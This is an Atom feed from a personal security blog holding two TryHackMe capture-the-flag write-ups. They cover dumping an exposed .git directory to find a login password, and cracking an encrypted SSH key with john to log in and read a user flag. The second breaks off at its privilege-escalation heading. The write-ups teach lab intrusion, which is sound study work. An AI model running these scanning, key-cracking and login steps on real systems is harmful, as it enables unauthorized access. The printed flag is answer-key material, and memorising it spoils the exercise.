<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="https://darrynbrownfield.co.uk/feed.xml" rel="self" type="application/atom+xml" /><link href="https://darrynbrownfield.co.uk/" rel="alternate" type="text/html" /><updated>2020-09-12T13:36:42+00:00</updated><id>https://darrynbrownfield.co.uk/</id><title type="html">Darryn Brownfield</title><subtitle>Infosec | Hacking | CTF</subtitle><entry><title type="html">Git-Happens Write Up</title><link href="https://darrynbrownfield.co.uk/githappens" rel="alternate" type="text/html" title="Git-Happens Write Up" /><published>2020-09-12T00:00:00+00:00</published><updated>2020-09-12T00:00:00+00:00</updated><id>https://darrynbrownfield.co.uk/githappens</id><content type="html" xml:base="https://darrynbrownfield.co.uk/githappens">&lt;p&gt;&lt;img src=&quot;/assets/images/githappens/cover.png&quot; alt=&quot;GitHappens&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;

&lt;p&gt;Git-Happens is an easy room from &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt; with the description:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Boss wanted me to create a prototype, so here it is! We even used something called “version control” that made deploying this really easy!&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;We only have 1 task, find the super secret password.&lt;/p&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;

&lt;p&gt;TryHackMe will assign a dynamic IP as part of the deployment, the IP I will be targeting is ‘10.10.39.144’. I started by doing an nmap scan to check what ports are open.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/GitHappens]
└──╼ $sudo nmap -sC -sV -oA nmap/initial 10.10.39.144
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-12 13:07 BST
Nmap scan report for 10.10.39.144
Host is up (0.025s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.0 (Ubuntu)
| http-git: 
|   10.10.39.144:80/.git/
|     Git repository found!
|_    Repository description: Unnamed repository; edit this file 'description' to name the...
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Super Awesome Site!
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.83 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The only port is HTTP, I browsed to the machine and found what appears to be a login page but nothing happened when I tried to log in.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/githappens/WebPage.png&quot; alt=&quot;WebPage&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I continued with some basic web enumeration by running Gobuster but didnt find anything.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/GitHappens]
└──╼ $gobuster dir -u http://10.10.39.144 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.39.144
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/12 13:15:14 Starting gobuster
===============================================================
/css (Status: 301)
===============================================================
2020/09/12 13:17:12 Finished
===============================================================
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;However nmap did find /.git/ so I looked at that next.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/githappens/GitPage.png&quot; alt=&quot;GitPage&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I tried to run git clone to download the files from the server but had no joy.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/GitHappens]
└──╼ $git clone http://10.10.39.144/
Cloning into '10.10.39.144'...
fatal: repository 'http://10.10.39.144/' not found
┌─[✗]─[daz@parrot]─[~/Documents/TryHackMe/GitHappens]
└──╼ $git clone http://10.10.39.144/.git
Cloning into '10.10.39.144'...
fatal: repository 'http://10.10.39.144/.git/' not found
┌─[✗]─[daz@parrot]─[~/Documents/TryHackMe/GitHappens]
└──╼ $git clone http://10.10.39.144/.git/
Cloning into '10.10.39.144'...
fatal: repository 'http://10.10.39.144/.git/' not found
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I did find some tools to dump the git files. However, I used wget using the -r flag to download the files.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/GitHappens]                                                                                                                             
└──╼ $wget -r http://10.10.39.144/.git/                                                                                                                                       
--2020-09-12 13:23:22--  http://10.10.39.144/.git/                                                                                                                            
Connecting to 10.10.39.144:80... connected.                                                                                                                                   
HTTP request sent, awaiting response... 200 OK                                                                                                                                
Length: unspecified [text/html]                                                                                                                                               
Saving to: ‘10.10.39.144/.git/index.html’                                                                                                                                     
                                                                                                                                                                              
10.10.39.144/.git/index.html                     [ &amp;lt;=&amp;gt;                                                                                           ]   1.36K  --.-KB/s    in 0s 

2020-09-12 13:23:22 (146 MB/s) - ‘10.10.39.144/.git/index.html’ saved [1391]

Loading robots.txt; please ignore errors.
--2020-09-12 13:23:22--  http://10.10.39.144/robots.txt
Reusing existing connection to 10.10.39.144:80.
HTTP request sent, awaiting response... 404 Not Found
2020-09-12 13:23:22 ERROR 404: Not Found.

--2020-09-12 13:23:22--  http://10.10.39.144/ 
Reusing existing connection to 10.10.39.144:80.
HTTP request sent, awaiting response... 200 OK
Length: 6890 (6.7K) [text/html]
Saving to: ‘10.10.39.144/index.html’

10.10.39.144/index.html                      100%[==============================================================================================&amp;gt;]   6.73K  --.-KB/s    in 0s 

2020-09-12 13:23:22 (16.1 MB/s) - ‘10.10.39.144/index.html’ saved [6890/6890]

--2020-09-12 13:23:22--  http://10.10.39.144/.git/branches/
Reusing existing connection to 10.10.39.144:80.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: ‘10.10.39.144/.git/branches/index.html’

&amp;lt;&amp;lt;SNIP&amp;gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now I had all the files, I took a look through but nothing jumped out as a super secret password so did some research on the git commands to see how I could use the files.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/GitHappens]
└──╼ $ls
10.10.39.144  nmap
┌─[daz@parrot]─[~/Documents/TryHackMe/GitHappens]
└──╼ $cd 10.10.39.144/
┌─[daz@parrot]─[~/Documents/TryHackMe/GitHappens/10.10.39.144]
└──╼ $ls -lah
total 8.0K
drwxr-xr-x 1 daz daz   34 Sep 12 13:23 .
drwxr-xr-x 1 daz daz   32 Sep 12 13:23 ..
drwxr-xr-x 1 daz daz   18 Sep 12 13:23 css
drwxr-xr-x 1 daz daz  158 Sep 12 13:23 .git
-rw-r--r-- 1 daz daz 6.8K Jul 23 23:39 index.html
┌─[daz@parrot]─[~/Documents/TryHackMe/GitHappens/10.10.39.144]
└──╼ $ls -lah .git
total 24K
drwxr-xr-x 1 daz daz  158 Sep 12 13:23 .
drwxr-xr-x 1 daz daz   34 Sep 12 13:23 ..
drwxr-xr-x 1 daz daz   20 Sep 12 13:23 branches
-rw-r--r-- 1 daz daz  110 Jul 24 07:25 config
-rw-r--r-- 1 daz daz   73 Jul 23 23:39 description
-rw-r--r-- 1 daz daz   23 Jul 23 23:39 HEAD
drwxr-xr-x 1 daz daz  434 Sep 12 13:23 hooks
-rw-r--r-- 1 daz daz  645 Jul 23 23:39 index
-rw-r--r-- 1 daz daz 1.4K Sep 12 13:23 index.html
drwxr-xr-x 1 daz daz   34 Sep 12 13:23 info
drwxr-xr-x 1 daz daz   36 Sep 12 13:23 logs
drwxr-xr-x 1 daz daz  164 Sep 12 13:23 objects
-rw-r--r-- 1 daz daz  102 Jul 24 07:25 packed-refs
drwxr-xr-x 1 daz daz   52 Sep 12 13:23 refs
┌─[daz@parrot]─[~/Documents/TryHackMe/GitHappens/10.10.39.144]
└──╼ $
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Running git without any flags shows the help output and some of available commands.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/GitHappens/10.10.39.144]                     
└──╼ $git                                                                          
usage: git [--version] [--help] [-C &amp;lt;path&amp;gt;] [-c &amp;lt;name&amp;gt;=&amp;lt;value&amp;gt;]                    
           [--exec-path[=&amp;lt;path&amp;gt;]] [--html-path] [--man-path] [--info-path]         
           [-p | --paginate | -P | --no-pager] [--no-replace-objects] [--bare]     
           [--git-dir=&amp;lt;path&amp;gt;] [--work-tree=&amp;lt;path&amp;gt;] [--namespace=&amp;lt;name&amp;gt;]            
           &amp;lt;command&amp;gt; [&amp;lt;args&amp;gt;]                                                      
                                                                                   
These are common Git commands used in various situations:                          
                                                                                   
start a working area (see also: git help tutorial)
   clone             Clone a repository into a new directory
   init              Create an empty Git repository or reinitialize an existing one

work on the current change (see also: git help everyday)
   add               Add file contents to the index
   mv                Move or rename a file, a directory, or a symlink
   restore           Restore working tree files
   rm                Remove files from the working tree and from the index
   sparse-checkout   Initialize and modify the sparse-checkout

examine the history and state (see also: git help revisions)
   bisect            Use binary search to find the commit that introduced a bug
   diff              Show changes between commits, commit and working tree, etc
   grep              Print lines matching a pattern
   log               Show commit logs
   show              Show various types of objects
   status            Show the working tree status

grow, mark and tweak your common history
   branch            List, create, or delete branches
   commit            Record changes to the repository
   merge             Join two or more development histories together
   rebase            Reapply commits on top of another base tip
   reset             Reset current HEAD to the specified state
   switch            Switch branches
   tag               Create, list, delete or verify a tag object signed with GPG

collaborate (see also: git help workflows)
   fetch             Download objects and refs from another repository
   pull              Fetch from and integrate with another repository or a local branch
   push              Update remote refs along with associated objects

'git help -a' and 'git help -g' list available subcommands and some
concept guides. See 'git help &amp;lt;command&amp;gt;' or 'git help &amp;lt;concept&amp;gt;'
to read about a specific subcommand or concept.
See 'git help git' for an overview of the system.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;First I ran the ‘log’ command to check the commits.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/GitHappens/10.10.39.144]             
└──╼ $git log                                                              
commit d0b3578a628889f38c0affb1b75457146a4678e5 (HEAD -&amp;gt; master, tag: v1.0)
Author: Adam Bertrand &amp;lt;hydragyrum@gmail.com&amp;gt;                               
Date:   Thu Jul 23 22:22:16 2020 +0000                                     
                                                                           
    Update .gitlab-ci.yml                                                  
                                                                           
commit 77aab78e2624ec9400f9ed3f43a6f0c942eeb82d                            
Author: Hydragyrum &amp;lt;hydragyrum@gmail.com&amp;gt;                                  
Date:   Fri Jul 24 00:21:25 2020 +0200                                     
                                                                           
    add gitlab-ci config to build docker file.                             
                                                                           
commit 2eb93ac3534155069a8ef59cb25b9c1971d5d199                            
Author: Hydragyrum &amp;lt;hydragyrum@gmail.com&amp;gt;                                  
Date:   Fri Jul 24 00:08:38 2020 +0200                                     
                                                                           
    setup dockerfile and setup defaults.                                   
                                                                           
commit d6df4000639981d032f628af2b4d03b8eff31213                            
Author: Hydragyrum &amp;lt;hydragyrum@gmail.com&amp;gt;                                  
Date:   Thu Jul 23 23:42:30 2020 +0200

    Make sure the css is standard-ish!

commit d954a99b96ff11c37a558a5d93ce52d0f3702a7d
Author: Hydragyrum &amp;lt;hydragyrum@gmail.com&amp;gt;
Date:   Thu Jul 23 23:41:12 2020 +0200

    re-obfuscating the code to be really secure!

commit bc8054d9d95854d278359a432b6d97c27e24061d
Author: Hydragyrum &amp;lt;hydragyrum@gmail.com&amp;gt;
Date:   Thu Jul 23 23:37:32 2020 +0200

    Security says obfuscation isn't enough.
    
    They want me to use something called 'SHA-512'

commit e56eaa8e29b589976f33d76bc58a0c4dfb9315b1
Author: Hydragyrum &amp;lt;hydragyrum@gmail.com&amp;gt;
Date:   Thu Jul 23 23:25:52 2020 +0200

    Obfuscated the source code.
    
    Hopefully security will be happy!

commit 395e087334d613d5e423cdf8f7be27196a360459
Author: Hydragyrum &amp;lt;hydragyrum@gmail.com&amp;gt;
Date:   Thu Jul 23 23:17:43 2020 +0200

    Made the login page, boss!

commit 2f423697bf81fe5956684f66fb6fc6596a1903cc
Author: Adam Bertrand &amp;lt;hydragyrum@gmail.com&amp;gt;
Date:   Mon Jul 20 20:46:28 2020 +0000

    Initial commit
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Great, we can now see all the commits. Commits 2 and 3 look interesting, clearly the security team were not happy with the configuration, so lets take a look at the source code. I will use git diff to compare. We could also use git checkout.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/GitHappens/10.10.39.144]
└──╼ $git diff 395e087334d613d5e423cdf8f7be27196a360459
&amp;lt;&amp;lt;SNIP&amp;gt;&amp;gt;
     &amp;lt;script&amp;gt;
-      function login() {
-        let form = document.getElementById(&quot;login-form&quot;);
-        console.log(form.elements);
-        let username = form.elements[&quot;username&quot;].value;
-        let password = form.elements[&quot;password&quot;].value;
-        if (
-          username === &quot;admin&quot; &amp;amp;&amp;amp;
-          password === &quot;&quot;
-        ) {
-          document.cookie = &quot;login=1&quot;;
-          window.location.href = &quot;/dashboard.html&quot;;
-        } else {
-          document.getElementById(&quot;error&quot;).innerHTML =
-            &quot;INVALID USERNAME OR PASSWORD!&quot;; 
-        }
-      }

&amp;lt;&amp;lt;SNIP&amp;gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Found it! Ive redacted it from the output as part of the TryHackMe write up rules however the password is part of the login function.&lt;/p&gt;

&lt;p&gt;Thanks for reading!&lt;/p&gt;</content><author><name>Darryn</name></author><category term="tryhackme" /><category term="ctf" /><summary type="html"></summary></entry><entry><title type="html">GamingServer Write Up</title><link href="https://darrynbrownfield.co.uk/gamingserver" rel="alternate" type="text/html" title="GamingServer Write Up" /><published>2020-09-06T00:00:00+00:00</published><updated>2020-09-06T00:00:00+00:00</updated><id>https://darrynbrownfield.co.uk/gamingserver</id><content type="html" xml:base="https://darrynbrownfield.co.uk/gamingserver">&lt;p&gt;&lt;img src=&quot;/assets/images/gamingserver/gamingserver.png&quot; alt=&quot;GamingServer&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;

&lt;p&gt;GamingServer is an easy Boot2Root machine from &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt; with 2 flags available ‘user.txt’ and ‘root.txt’.&lt;/p&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;

&lt;p&gt;TryHackMe will assign a dynamic IP as part of the deployment, the IP I will be targeting is ‘10.10.100.235’. I start by doing an nmap scan to check what ports are open.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]
└──╼ #nmap -sC -sV -oA nmap/initial 10.10.100.235
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-06 14:40 BST
Nmap scan report for 10.10.100.235
Host is up (0.026s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 34:0e:fe:06:12:67:3e:a4:eb:ab:7a:c4:81:6d:fe:a9 (RSA)
|   256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA)
|_  256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: House of danak
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.88 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Two ports, 22 and 80. I will look at port 80 first.&lt;/p&gt;

&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;

&lt;p&gt;Port 80 brings us to a simple web page, while I look around the website I started a Gobuster in the background.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]
└──╼ #gobuster dir -u http://10.10.100.235 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.100.235
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/06 14:45:50 Starting gobuster
===============================================================
/uploads (Status: 301)
/secret (Status: 301)
/server-status (Status: 403)
===============================================================
2020/09/06 14:48:03 Finished
===============================================================
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Looking at the source I do see a comment aimed at someone called ‘john’, could be a possible username.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;john, please add some actual content to the site! lorem ipsum is horrible to look at.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/gamingserver/source.png&quot; alt=&quot;source&quot; /&gt;&lt;/p&gt;

&lt;p&gt;On the DRAAGAN LORE page is a link to ‘uploads’ which redirects to a directory.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/gamingserver/draaganlore.png&quot; alt=&quot;draaganlore&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The directory contains 3 files.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/gamingserver/uploads.png&quot; alt=&quot;uploads&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Using wget I downloaded each one.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]
└──╼ #wget http://10.10.100.235/uploads/dict.lst
--2020-09-06 14:50:33--  http://10.10.100.235/uploads/dict.lst
Connecting to 10.10.100.235:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2006 (2.0K)
Saving to: ‘dict.lst’

dict.lst                              100%[========================================================================&amp;gt;]   1.96K  --.-KB/s    in 0s   

2020-09-06 14:50:33 (229 MB/s) - ‘dict.lst’ saved [2006/2006]

┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]
└──╼ #wget http://10.10.100.235/uploads/manifesto.txt
--2020-09-06 14:50:52--  http://10.10.100.235/uploads/manifesto.txt
Connecting to 10.10.100.235:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3070 (3.0K) [text/plain]
Saving to: ‘manifesto.txt’

manifesto.txt                         100%[========================================================================&amp;gt;]   3.00K  --.-KB/s    in 0s   

2020-09-06 14:50:52 (530 MB/s) - ‘manifesto.txt’ saved [3070/3070]

┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]
└──╼ #wget http://10.10.100.235/uploads/meme.jpg
--2020-09-06 14:51:09--  http://10.10.100.235/uploads/meme.jpg
Connecting to 10.10.100.235:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 15457 (15K) [image/jpeg]
Saving to: ‘meme.jpg’

meme.jpg                              100%[========================================================================&amp;gt;]  15.09K  --.-KB/s    in 0.02s

2020-09-06 14:51:09 (679 KB/s) - ‘meme.jpg’ saved [15457/15457]

┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]
└──╼ #
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Looking at each file:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;dict.lst - Appears to be a list of passwords&lt;/li&gt;
  &lt;li&gt;manifesto.txt - Is a copy of ‘The Hacker Manifesto’ by The Mentor from January 8 1986&lt;/li&gt;
  &lt;li&gt;meme.jpg - Is an image of a muppet&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The dict.lst could be useful, looking back at the Gobuster output is a /secret directory.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/gamingserver/secret.png&quot; alt=&quot;secret&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Inside is a SecretKey. Again I will download with wget.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]                                                                                     
└──╼ #wget http://10.10.100.235/secret/secretKey                                                                                                 
--2020-09-06 14:50:07--  http://10.10.100.235/secret/secretKey                                                                                   
Connecting to 10.10.100.235:80... connected.                                                                                                     
HTTP request sent, awaiting response... 200 OK                                                                                                   
Length: 1766 (1.7K)                                                                                                                              
Saving to: ‘secretKey’                                                                                                                           
                                                                                                                                                 
secretKey                             100%[========================================================================&amp;gt;]   1.72K  --.-KB/s    in 0s 
                                                                                                                                                 
2020-09-06 14:52:07 (223 MB/s) - ‘secretKey’ saved [1766/1766]   
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Great it looks like a encrypted SSH id_rsa key, lets use the password list from the upload folder to crack.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]
└──╼ #cat secretKey 
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547

T7+F+3ilm5FcFZx24mnrugMY455vI461ziMb4NYk9YJV5uwcrx4QflP2Q2Vk8phx
H4P+PLb79nCc0SrBOPBlB0V3pjLJbf2hKbZazFLtq4FjZq66aLLIr2dRw74MzHSM
FznFI7jsxYFwPUqZtkz5sTcX1afch+IU5/Id4zTTsCO8qqs6qv5QkMXVGs77F2kS
Lafx0mJdcuu/5aR3NjNVtluKZyiXInskXiC01+Ynhkqjl4Iy7fEzn2qZnKKPVPv8
9zlECjERSysbUKYccnFknB1DwuJExD/erGRiLBYOGuMatc+EoagKkGpSZm4FtcIO
IrwxeyChI32vJs9W93PUqHMgCJGXEpY7/INMUQahDf3wnlVhBC10UWH9piIOupNN
SkjSbrIxOgWJhIcpE9BLVUE4ndAMi3t05MY1U0ko7/vvhzndeZcWhVJ3SdcIAx4g
/5D/YqcLtt/tKbLyuyggk23NzuspnbUwZWoo5fvg+jEgRud90s4dDWMEURGdB2Wt
w7uYJFhjijw8tw8WwaPHHQeYtHgrtwhmC/gLj1gxAq532QAgmXGoazXd3IeFRtGB
6+HLDl8VRDz1/4iZhafDC2gihKeWOjmLh83QqKwa4s1XIB6BKPZS/OgyM4RMnN3u
Zmv1rDPL+0yzt6A5BHENXfkNfFWRWQxvKtiGlSLmywPP5OHnv0mzb16QG0Es1FPl
xhVyHt/WKlaVZfTdrJneTn8Uu3vZ82MFf+evbdMPZMx9Xc3Ix7/hFeIxCdoMN4i6
8BoZFQBcoJaOufnLkTC0hHxN7T/t/QvcaIsWSFWdgwwnYFaJncHeEj7d1hnmsAii
b79Dfy384/lnjZMtX1NXIEghzQj5ga8TFnHe8umDNx5Cq5GpYN1BUtfWFYqtkGcn
&amp;lt;&amp;lt;SNIP&amp;gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I used the ssh2john Python script to extract the password hash from the key file.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]
└──╼ #/usr/share/john/ssh2john.py secretKey &amp;gt; cracked
┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]
└──╼ #cat cracked 
secretKey:$sshng$1$16$82823EE792E75948EE2DE731AF1A0547$1200$4fbf85fb78a59b915c159c76e269ebba0318e39e6f238eb5ce231be0d624f58255e6ec1caf1e107e53f6436564f
298711f83fe3cb6fbf6709cd12ac138f065074577a632c96dfda129b65acc52edab816366aeba68b2c8af6751c3be0ccc748c1739c523b8ecc581703d4a99b64cf9b13717d5a7dc87e214e7
f21de334d3b023bcaaab3aaafe5090c5d51acefb1769122da7f1d2625d72ebbfe5a477363355b65b8a672897227b245e20b4d7e627864aa3978232edf1339f6a999ca28f54fbfcf739440a3
1114b2b1b50a61c7271649c1d43c2e244c43fdeac64622c160e1ae31ab5cf84a1a80a906a52666e05b5c20e22bc317b20a1237daf26cf56f773d4a8732008919712963bfc834c5106a10dfd
f09e5561042d745161fda6220eba934d4a48d26eb2313a058984872913d04b5541389dd00c8b7b74e4c635534928effbef8739dd79971685527749d708031e20ff90ff62a70bb6dfed29b2f
2bb2820936dcdceeb299db530656a28e5fbe0fa312046e77dd2ce1d0d630451119d0765adc3bb982458638a3c3cb70f16c1a3c71d0798b4782bb708660bf80b8f583102ae77d900209971a8
6b35dddc878546d181ebe1cb0e5f15443cf5ff889985a7c30b682284a7963a398b87cdd0a8ac1ae2cd57201e8128f652fce83233844c9cddee666bf5ac33cbfb4cb3b7a03904710d5df90d7
c5591590c6f2ad8869522e6cb03cfe4e1e7bf49b36f5e901b412cd453e5c615721edfd62a569565f4ddac99de4e7f14bb7bd9f363057fe7af6dd30f64cc7d5dcdc8c7bfe115e23109da0c37
88baf01a1915005ca0968eb9f9cb9130b4847c4ded3fedfd0bdc688b1648559d830c276056899dc1de123eddd619e6b008a26fbf437f2dfce3f9678d932d5f5357204821cd08f981af13167
1def2e983371e42ab91a960dd4152d7d6158aad906727bf32d224cd3b44082a03e48f018f250a75def2037e36fffdfbffbfba279f785b4e9aba435369117ebf49859631f5390bc13a8e3f45
&amp;lt;&amp;lt;SNIP&amp;gt;&amp;gt;
┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]
└──╼ #
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now with the hash I can use john to crack.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]
└──╼ #john cracked -w dict.lst 
Warning: only loading hashes of type &quot;SSH&quot;, but also saw type &quot;tripcode&quot;
Use the &quot;--format=tripcode&quot; option to force loading hashes of that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
          (secretKey)
1g 0:00:00:00 DONE (2020-09-06 15:20) 100.0g/s 354600p/s 354600c/s 354600C/s 1701d..sss
Session completed
┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]
└──╼ #
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;It doesn’t take long to crack. Using the key and password I should be able to SSH in to the machine. However, I dont know the username, going back to the HTML comment earlier, I will try with the username ‘john’. First I need to chmod 600 the key file before I can use it.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]
└──╼ #chmod 600 secretKey 
┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]
└──╼ #ssh -i secretKey john@10.10.100.235
The authenticity of host '10.10.100.235 (10.10.100.235)' can't be established.
ECDSA key fingerprint is SHA256:LO5bYqjXqLnB39jxUzFMiOaZ1YnyFGGXUmf1edL6R9o.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.100.235' (ECDSA) to the list of known hosts.
Enter passphrase for key 'secretKey': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-76-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Sep  6 14:23:42 UTC 2020

  System load:  0.0               Processes:           96
  Usage of /:   41.3% of 9.78GB   Users logged in:     0
  Memory usage: 40%               IP address for eth0: 10.10.100.235
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.


Last login: Mon Jul 27 20:17:26 2020 from 10.8.5.10
john@exploitable:~$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Im in! Lets grab the first flag.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;john@exploitable:~$ ls
user.txt
john@exploitable:~$ cat user.txt
a5c2ff8b9c2e
john@exploitable:~$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h3&gt;

